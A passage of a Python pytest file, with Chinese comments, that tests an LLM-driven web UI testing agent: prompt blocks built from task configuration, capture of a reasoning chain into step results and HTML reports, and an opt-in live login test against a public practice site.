         patch("agents.ui.execution_graph.get_step_prompt", return_value="STEP"), \
         patch("core.memory_utils.retrieve_memories", new=AsyncMock(return_value="")), \
         patch("agents.ui.tools.set_current_task"):
        await decide_node(state)

    # 找到 HumanMessage 含 page_summary, 验证截断生效
    from langchain_core.messages import HumanMessage
    human_msgs = [m for m in captured.get("msgs", []) if isinstance(m, HumanMessage)]
    assert human_msgs, "decide_node 应有 HumanMessage"
    page_summary = human_msgs[-1].content
    if isinstance(page_summary, list):
        # multimodal
        page_summary = next((c["text"] for c in page_summary if c.get("type") == "text"), "")
    # 长 element text 不应完整出现
    assert "x" * 200 not in page_summary
    assert "..." in page_summary or "省略" in page_summary or "truncated" in page_summary.lower()


# ---------------------------------------------------------------------------
# V2.0 C (2026-06-02): 联动 L1 业务模型 — rules/focus_areas/scenarios/risk_points
# ---------------------------------------------------------------------------

def test_c1_prd_rules_block_injected(sample_test_case):
    """C1 契约: task_config.rules 应进 <prd_rules> 块, LLM 看到 PRD 规则."""
    from agents.ui.prompts import get_execution_system_prompt

    cfg = {"rules": ["不要测试支付", "只测 functional 类别"]}
    p = get_execution_system_prompt(sample_test_case, cfg)
    assert "<prd_rules>" in p
    assert "不要测试支付" in p
    assert "只测 functional 类别" in p


def test_c2_focus_areas_block_injected_as_list(sample_test_case):
    """C2 契约: task_config.focus_areas 是 list 时, 应进 <focus_areas> 块."""
    from agents.ui.prompts import get_execution_system_prompt

    cfg = {"focus_areas": ["登录", "导航", "表单校验"]}
    p = get_execution_system_prompt(sample_test_case, cfg)
    assert "<focus_areas>" in p
    assert "登录" in p
    assert "导航" in p
    assert "表单校验" in p


def test_c2_focus_areas_string_normalized_to_list(sample_test_case):
    """C2 契约: task_config.focus_areas 是 string (逗号/换行分隔) 时, 应规范化为 list."""
    from agents.ui.prompts import get_execution_system_prompt

    cfg = {"focus_areas": "登录,导航\n表单"}
    p = get_execution_system_prompt(sample_test_case, cfg)
    assert "<focus_areas>" in p
    # 三个都应出现
    assert "登录" in p
    assert "导航" in p
    assert "表单" in p


def test_c3_scenarios_block_injected(sample_test_case):
    """C3 契约: task_config._scenarios 应进 <scenarios> 块."""
    from agents.ui.prompts import get_execution_system_prompt

    cfg = {
        "_scenarios": [
            {"priority": "high", "name": "采购申请", "entry_hint": "菜单 > 采购管理 > 新建"},
            {"priority": "medium", "name": "库存查询", "entry_hint": "导航栏 > 库存"},
        ]
    }
    p = get_execution_system_prompt(sample_test_case, cfg)
    assert "<scenarios>" in p
    assert "采购申请" in p
    assert "库存查询" in p
    assert "菜单 > 采购管理 > 新建" in p
    # priority 标签
    assert "high" in p
    assert "medium" in p


def test_c4_risk_points_block_injected(sample_test_case):
    """C4 契约: task_config._risk_points 应进 <risk_points> 块."""
    from agents.ui.prompts import get_execution_system_prompt

    cfg = {
        "_risk_points": [
            {"severity": "high", "description": "SQL 注入漏洞在搜索框"},
            {"severity": "medium", "description": "密码字段无强度校验"},
        ]
    }
    p = get_execution_system_prompt(sample_test_case, cfg)
    assert "<risk_points>" in p
    assert "SQL 注入" in p
    assert "密码字段" in p
    assert "high" in p


def test_c5_step_result_has_reasoning_chain_field():
    """C5 契约: StepResult 新增 reasoning_chain 字段, list[str]."""
    from core.interfaces import StepResult, AssertionResult
    sr = StepResult(
        step_index=0,
        action_type="click",
        action_target="#login",
        action_args={"target": "#login"},
        result="ok",
        assertion=AssertionResult(status="pass", reasoning="通过"),
        thought="点击登录按钮",
        reasoning_chain=["[Decide] 我决定点击登录", "[Assert] 通过"],
    )
    assert sr.reasoning_chain == ["[Decide] 我决定点击登录", "[Assert] 通过"]


@pytest.mark.asyncio
async def test_c5_record_node_captures_reasoning_chain(sample_test_case):
    """C5 集成: record_node 实际运行时, 应从 decide AIMessage + _last_assertion 抽取 reasoning_chain."""
    from agents.ui.execution_graph import record_node
    from langchain_core.messages import AIMessage
    from core.interfaces import AssertionResult

    # 模拟 decide_node 返回的 AIMessage (含 thinking 块)
    ai_msg = AIMessage(
        content=[
            {"type": "thinking", "thinking": "我看到登录页, 应该输入用户名"},
            {"type": "text", "text": "Input text"},
        ],
        tool_calls=[{"name": "input_text", "args": {"target": "#1", "value": "practice"}, "id": "c1"}],
    )
    state = {
        "messages": [ai_msg],
        "current_step": 1,  # execute incremented to 1
        "consecutive_failures": 0,
        "_last_tool_result": "ok",
        "_last_change_report": None,
        "_last_assertion": AssertionResult(status="inconclusive", reasoning="中间步骤"),
    }
    result = await record_node(state)
    steps = result.get("_collected_steps", [])
    assert len(steps) == 1
    chain = steps[0].reasoning_chain
    assert len(chain) == 2, f"应 2 条, 实际 {chain}"
    assert "[Decide]" in chain[0]
    assert "我看到登录页" in chain[0]
    assert "[Assert]" in chain[1]
    assert "中间步骤" in chain[1]


@pytest.mark.asyncio
async def test_c5_report_builder_includes_reasoning_chain_html():
    """C5 集成: ReportBuilder HTML 报告应含 💭 AI 思考链 折叠区 (details/summary)."""
    from core.report_builder import ReportBuilder
    from core.interfaces import StepResult, AssertionResult, TestResult

    rb = ReportBuilder(task_id="c5-test")
    rb.add_result(TestResult(
        test_case_id="TC-001",
        test_case_title="登录",
        status="passed",
        steps=[
            StepResult(
                step_index=0,
                action_type="click",
                action_target="#login",
                result="ok",
                assertion=AssertionResult(status="pass", reasoning="通过"),
                reasoning_chain=["[Decide] 我看到登录页", "[Assert] 通过"],
            )
        ],
    ))
    # 调用 build_html
    html = rb.build_html(ai_summary="共 1 个用例")
    assert "AI 思考链" in html, "C5 报告缺 AI 思考链折叠区"
    assert "<details>" in html
    assert "我看到登录页" in html
    assert "通过" in html


# ---------------------------------------------------------------------------
# Live integration test (costs tokens, requires L2_LIVE=1)
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
@pytest.mark.skipif(not os.getenv("L2_LIVE"), reason="set L2_LIVE=1 to run with real LLM")
async def test_l2_live_practice_login(sample_test_case, sample_task_config):
    """End-to-end L2 live test against practice.expandtesting.com.

    Verifies decide_node -> execute_node -> assert_node -> record_node loop works
    with a real LLM and the public test site.
    """
    from agents.ui.execution_graph import build_execution_graph
    from langchain_core.messages import SystemMessage
    from agents.ui.tools import set_current_page, set_current_task

    from playwright.sync_api import sync_playwright
    p = sync_playwright().start()
    browser = p.chromium.launch(headless=True)
    page = browser.new_page()
    page.goto("https://practice.expandtesting.com/login", wait_until="domcontentloaded", timeout=15000)

    # Bind to the langchain tools page registry
    set_current_task("live-task")
    set_current_page(page, task_id="live-task")

    state = {
        "task_id": "live-task",
        "task_plan": [sample_test_case],
        "setups": {},
        "current_index": 0,
        "current_step": 0,
        "results": [],
        "consecutive_failures": 0,
        "page_info": {},
        "screenshot": "",
        "state_before": {},
        "state_after": {},
        "task_config": dict(sample_task_config),
        "session_summary": "",
        "messages": [SystemMessage(content="Start: 登录测试")],
    }

    graph = build_execution_graph()
    final_state = dict(state)
    try:
        async for event in graph.astream(state):
            for k, v in (event.items() if isinstance(event, dict) else []):
                if isinstance(v, dict):
                    final_state.update(v)
    finally:
        browser.close()
        p.stop()

    assert final_state.get("consecutive_failures", 0) < int(os.getenv("MAX_CONSECUTIVE_FAILURES", "3")), \
        f"too many failures: {final_state.get('consecutive_failures')}"
    steps = final_state.get("_collected_steps", [])
    assert steps, "no steps collected"
    final_assertion = steps[-1].assertion
    assert final_assertion is not None
    print(f"\n[live] steps={len(steps)} final_status={final_assertion.status}")
